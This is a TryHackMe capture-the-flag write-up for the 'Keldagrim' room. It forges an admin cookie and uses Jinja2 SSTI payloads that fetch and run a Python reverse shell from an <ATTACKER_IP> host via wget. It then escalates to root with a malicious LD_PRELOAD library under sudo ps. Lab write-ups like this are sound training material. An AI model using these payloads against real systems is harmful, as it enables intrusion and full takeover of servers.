# [Keldagrim](https://tryhackme.com/room/keldagrim)

## The dwarves are hiding their gold!

# Infiltrate the Forge

## Can you overcome the forge and steal all of the gold!

### user.txt

1. Start with an Nmap service scan to enumerate open ports and identify running services.

```bash
nmap -sV <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug httpd 3.0.6 (Python 3.8.10)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Inspect the cookies set by the application. The session cookie holds a Base64-encoded username. Decode the current value to confirm it identifies a guest or low-privilege user, then overwrite it with `YWRtaW4=`(Base64 for admin) and revisit `http://<TARGET_IP>/admin`.

[SCREEN01]

3. The admin panel reads a sales cookie and renders its value directly inside a Flask/Jinja2 template — a classic Server-Side Template Injection (SSTI) entry point. Payloads must be URL-encoded and then Base64-encoded before being placed into the cookie. Use the following payload to dump the complete Flask application configuration:

Original payload: `{{ config.items() }}`

Base64-encoded:

```
JTdCJTdCJTIwY29uZmlnJTJFaXRlbXMlMjglMjklMjAlN0QlN0QlMjc=
```

**Results:**

```
Current user - dict_items([('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', 'If_only_this_was_a_flag'), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093)])'
```

4. To reach Remote Code Execution, abuse SSTI to walk Python's object hierarchy and locate the subprocess.Popen class. The approach is to iterate through all subclasses of object from various offsets until subprocess.Popen appears as the first entry:

```python
{{''.__class__.__mro__[1].__subclasses__()[<INDEX>:]}}
```

Increment `<INDEX>` in steps and URL-encode + Base64-encode each payload before placing it in the sales cookie. For my machine the correct offset was **356**.

Base64-encoded:

```
JTdCJTdCJycuX19jbGFzc19fLl9fbXJvX18lNUIxJTVELl9fc3ViY2xhc3Nlc19fKCklNUIzNTY6JTVEJTdEJTdE
```

5. Prepare a Python reverse shell script on your attacking machine and host it with a simple HTTP server. Open a Netcat listener on port 4444 in a second terminal to catch the incoming connection.

```python
import sys, socket, os, pty

RHOST = "<ATTACKER_IP>"
RPORT = 4444

s = socket.socket()
s.connect((RHOST, RPORT))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn("/bin/sh")
```

Serve the file from your attacking machine:

```bash
python3 -m http.server 8000
```

Start the listener in a separate terminal:

```bash
nc -lvnp 4444
```

6. Use the SSTI RCE to make the target fetch `script.py` from your HTTP server. The payload calls `subprocess.Popen` with `wget`:

```python
{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[356](["wget", "http://<ATTACKER_IP>:8000/script.py"], stdout=-1, stderr=-1).communicate()}}
```

URL-encode and Base64-encode this payload, set it as the `sales` cookie value, and refresh the admin page. The file is downloaded to the application's working directory on the target server.

7. Execute the downloaded script using the same SSTI RCE technique:

```python
{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[356](["python3", "./script.py"], stdout=-1, stderr=-1).communicate()}}
```

URL-encode and Base64-encode the payload, place it in the `sales` cookie, and refresh the admin page. Your Netcat listener receives the reverse shell as user jed.

8. Read the user flag:

```bash
cat /home/jed/user.txt
```

[SCREEN02]

---

### root.txt

1. Upgrade to a fully interactive TTY session so job control and special characters work correctly:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash");'
export TERM=xterm
Ctrl+Z
stty raw -echo;fg;
```

2. Check what the current user can run with elevated privileges:

```bash
sudo -l
```

**Results:**

```
Matching Defaults entries for jed on ip-10-113-182-158:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User jed may run the following commands on ip-10-113-182-158:
    (ALL : ALL) NOPASSWD: /bin/ps
```

Two misconfigurations are exploitable here: `env_keep+=LD_PRELOAD` means the `LD_PRELOAD` environment variable is preserved when running `sudo`, and `ps` may be run as root without a password. `LD_PRELOAD` tells the dynamic linker to load a specified shared library before all others - if we supply a malicious library that spawns a shell, it runs with root privileges before `ps` is even reached.

3. Create the following C source file at `/tmp/shell.c`. The `_init()` function is a constructor that fires automatically when the shared library is loaded. It clears `LD_PRELOAD` to prevent recursive loading, sets both GID and UID to 0 (root), then spawns a shell.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/sh");
}
```

4. Compile the source as a Position-Independent, shared object (the `-nostartfiles` flag prevents the linker from adding its own startup code that would conflict with `_init`). Then invoke `ps` via `sudo` with `LD_PRELOAD` pointing at the compiled library. The dynamic linker loads `shell.so` first, `_init()` fires, and a root shell is spawned before `ps` runs.

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /bin/ps
```

5. Read the root flag:

```bash
cat /root/root.txt
```

[SCREEN03]
